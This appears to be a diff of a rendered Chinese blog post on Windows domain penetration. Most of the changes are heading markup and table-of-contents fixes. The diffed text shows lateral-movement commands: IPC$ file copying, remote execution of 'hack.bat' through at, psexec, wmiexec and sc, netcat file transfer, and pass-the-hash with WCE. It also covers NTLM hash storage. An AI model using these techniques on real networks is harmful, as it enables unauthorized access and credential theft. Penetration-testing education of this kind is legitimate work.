@@ -94,7 +94,7 @@
 <meta property="og:site_name" content="Zeal's Blog">
 <meta property="og:description" content="之前写过一篇内网当中域渗透的简单文章。好久没遇到忘得差不多了。前几天做项目，正好碰到了域环境，正好有时间，再回顾一下原来的知识，另外把新补充的知识再记录一下。
 域相关知识什么是域域英文叫DOMAIN——域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域">
-<meta property="og:updated_time" content="2017-01-24T06:55:07.000Z">
+<meta property="og:updated_time" content="2017-01-24T06:56:22.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="域渗透基础知识">
 <meta name="twitter:description" content="之前写过一篇内网当中域渗透的简单文章。好久没遇到忘得差不多了。前几天做项目，正好碰到了域环境，正好有时间，再回顾一下原来的知识，另外把新补充的知识再记录一下。
@@ -446,8 +446,7 @@
 <li>命令输入错误.</li>
 <li>用户名或密码错误. </li>
 </ol>
-<p>###常见错误号：</p>
-<ol>
+<h3 id="常见错误号："><a href="#常见错误号：" class="headerlink" title="常见错误号："></a>常见错误号：</h3><ol>
 <li>错误号5，拒绝访问 ： 很可能你使用的用户不是管理员权限的，先提升权限； </li>
 <li>错误号51，Windows 无法找到网络路径 : 网络有问题； </li>
 <li>错误号53，找不到网络路径 ： ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）； </li>
@@ -456,18 +455,16 @@
 <li>错误号1792，试图登录，但是网络登录服务没有启动 ： 目标NetLogon服务未启动。（连接域控会出现此情况） </li>
 <li>错误号2242，此用户的密码已经过期 ： 目标有帐号策略，强制定期要求更改密码。</li>
 </ol>
-<p>##域内的文件操作</p>
-<p>####利用IPC$<br>建立ipc连接以后，就可以访问目标机器的文件（上传、下载），也可以在目标机器上运行命令。</p>
+<h2 id="域内的文件操作"><a href="#域内的文件操作" class="headerlink" title="域内的文件操作"></a>域内的文件操作</h2><h4 id="利用IPC"><a href="#利用IPC" class="headerlink" title="利用IPC$"></a>利用IPC$</h4><p>建立ipc连接以后，就可以访问目标机器的文件（上传、下载），也可以在目标机器上运行命令。</p>
 <p>上传和下载文件直接通过copy命令就可以，不过路径换成UNC路径。</p>
 <p>何为UNC路径？简单来讲以\开头的路径就是UNC路径，比如\192.168.1.2\c$\boot.ini。</p>
 <p>如果要从本地当前目录上传1.bat到192.168.1.2机器C盘根目录下，那么命令就是<br><code>copy 1.bat \\192.168.1.2\C$\</code></p>
 <p>反之就是下载。dir、copy、xcopy、move、type的参数都可以使用UNC路径。</p>
-<p>####利用Telnet<br>服务端：<code>nc -lvp 23 &lt; nc.exe</code></p>
+<h4 id="利用Telnet"><a href="#利用Telnet" class="headerlink" title="利用Telnet"></a>利用Telnet</h4><p>服务端：<code>nc -lvp 23 &lt; nc.exe</code></p>
 <p>下载端：<code>telnet ip -f c:\nc.exe</code></p>
-<p>####利用文件共享<br>映射目标<br><code>net use x: \\[目标IP]\[地址] [域用户password] /user:[域]\[username]</code></p>
-<p>##域内运行命令</p>
-<p>###利用计划任务<br><code>at \\192.168.200.100 15:00 c:\hack.bat</code></p>
-<p>###psexec<br>psexec针对远程建立连接的认证方式有两种，一种先建立ipc连接，然后直接用psexec \192.168.200.100 cmd命令开启一个半交互式的cmdshell，另一种是在psexec的参数中指定账号密码。<br>参数：</p>
+<h4 id="利用文件共享"><a href="#利用文件共享" class="headerlink" title="利用文件共享"></a>利用文件共享</h4><p>映射目标<br><code>net use x: \\[目标IP]\[地址] [域用户password] /user:[域]\[username]</code></p>
+<h2 id="域内运行命令"><a href="#域内运行命令" class="headerlink" title="域内运行命令"></a>域内运行命令</h2><h3 id="利用计划任务"><a href="#利用计划任务" class="headerlink" title="利用计划任务"></a>利用计划任务</h3><p><code>at \\192.168.200.100 15:00 c:\hack.bat</code></p>
+<h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>psexec针对远程建立连接的认证方式有两种，一种先建立ipc连接，然后直接用psexec \192.168.200.100 cmd命令开启一个半交互式的cmdshell，另一种是在psexec的参数中指定账号密码。<br>参数：</p>
 <blockquote>
 <p>-s 参数用来以system权限执行</p>
 <p>–accepteula 绕过第一次运行的弹窗</p>
@@ -475,17 +472,21 @@
 <p>-d 不等待程序执行完就返回</p>
 </blockquote>
 <p><code>psexec \\192.168.1.2 c:\hack.bat</code></p>
-<p>###wmiexec<br>T00ls大牛写的一款工具。早就传开了。<br>半交互模式：<br><code>cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password</code></p>
+<h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><p>T00ls大牛写的一款工具。早就传开了。<br>半交互模式：<br><code>cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password</code></p>
 <p>单个命令执行的模式：<br><code>cscript.exe  wmiexec.vbs /cmd 192.168.1.1 username password  &quot;command&quot;</code></p>
 <p>如果有时候我们抓取到的是hash，破解不了时可以利用WCE的hash注入，然后再执行WMIEXEC（不提供账号密码）就可以了。</p>
 <pre><code>cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1  
 wce -s [hash] 
 cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1
-</code></pre><p>###SC创建服务执行<br>    1、系统权限(其中test为服务名)<br>    sc \DC1 create test binpath= c:\cmd.exe<br>    sc \DC1 start test<br>    sc \DC1 delete test</p>
-<pre><code>2.指定用户权限启动
+</code></pre><h3 id="SC创建服务执行"><a href="#SC创建服务执行" class="headerlink" title="SC创建服务执行"></a>SC创建服务执行</h3><pre><code>1、系统权限(其中test为服务名)
+sc \\DC1 create test binpath= c:\cmd.exe
+sc \\DC1 start test
+sc \\DC1 delete test
+
+2.指定用户权限启动
 sc \\DC1 create test binpath = &quot;c:\1.exe&quot; obj= &quot;centoso\administrator&quot; passwrod= test
 sc \\DC1 start test
-</code></pre><p>##hash相关知识<br>windows的密码是经过hash后存储的，本地存在sam，system注册表中，域里面存在ntds.dit中。密码hash有两种格式，LM hash和NT hash。</p>
+</code></pre><h2 id="hash相关知识"><a href="#hash相关知识" class="headerlink" title="hash相关知识"></a>hash相关知识</h2><p>windows的密码是经过hash后存储的，本地存在sam，system注册表中，域里面存在ntds.dit中。密码hash有两种格式，LM hash和NT hash。</p>
 <p>| 2000 | xp | 2003 | Vista | win7 | 2008 | 2012 | </p>
 <p>前面三个默认是LM hash,当密码超过14位时候会采用NTLM加密 </p>
 <p><code>test:1003:E52CAC67419A9A22664345140A852F61:67A54E1C9058FCA16498061B96863248:::</code></p>
@@ -743,7 +744,7 @@ sc \\DC1 start test
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#域相关知识"><span class="nav-number">1.</span> <span class="nav-text">域相关知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是域"><span class="nav-number">1.1.</span> <span class="nav-text">什么是域</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#域相关概念"><span class="nav-number">1.2.</span> <span class="nav-text">域相关概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#域的搭建过程"><span class="nav-number">1.3.</span> <span class="nav-text">域的搭建过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是ipc-连接"><span class="nav-number">2.</span> <span class="nav-text">什么是ipc$连接</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ipc-概念"><span class="nav-number">2.1.</span> <span class="nav-text">ipc$概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ipc-的作用"><span class="nav-number">2.2.</span> <span class="nav-text">ipc$的作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ipc-的利用条件"><span class="nav-number">2.3.</span> <span class="nav-text">ipc$的利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ipc连接失败的原因"><span class="nav-number">2.4.</span> <span class="nav-text">ipc连接失败的原因</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#域相关知识"><span class="nav-number">1.</span> <span class="nav-text">域相关知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是域"><span class="nav-number">1.1.</span> <span class="nav-text">什么是域</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#域相关概念"><span class="nav-number">1.2.</span> <span class="nav-text">域相关概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#域的搭建过程"><span class="nav-number">1.3.</span> <span class="nav-text">域的搭建过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是ipc-连接"><span class="nav-number">2.</span> <span class="nav-text">什么是ipc$连接</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ipc-概念"><span class="nav-number">2.1.</span> <span class="nav-text">ipc$概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ipc-的作用"><span class="nav-number">2.2.</span> <span class="nav-text">ipc$的作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ipc-的利用条件"><span class="nav-number">2.3.</span> <span class="nav-text">ipc$的利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ipc连接失败的原因"><span class="nav-number">2.4.</span> <span class="nav-text">ipc连接失败的原因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见错误号："><span class="nav-number">2.5.</span> <span class="nav-text">常见错误号：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域内的文件操作"><span class="nav-number">3.</span> <span class="nav-text">域内的文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#利用IPC"><span class="nav-number">3.0.1.</span> <span class="nav-text">利用IPC$</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用Telnet"><span class="nav-number">3.0.2.</span> <span class="nav-text">利用Telnet</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用文件共享"><span class="nav-number">3.0.3.</span> <span class="nav-text">利用文件共享</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域内运行命令"><span class="nav-number">4.</span> <span class="nav-text">域内运行命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用计划任务"><span class="nav-number">4.1.</span> <span class="nav-text">利用计划任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#psexec"><span class="nav-number">4.2.</span> <span class="nav-text">psexec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wmiexec"><span class="nav-number">4.3.</span> <span class="nav-text">wmiexec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SC创建服务执行"><span class="nav-number">4.4.</span> <span class="nav-text">SC创建服务执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hash相关知识"><span class="nav-number">5.</span> <span class="nav-text">hash相关知识</span></a></li></ol></div>
             
 
           </div>
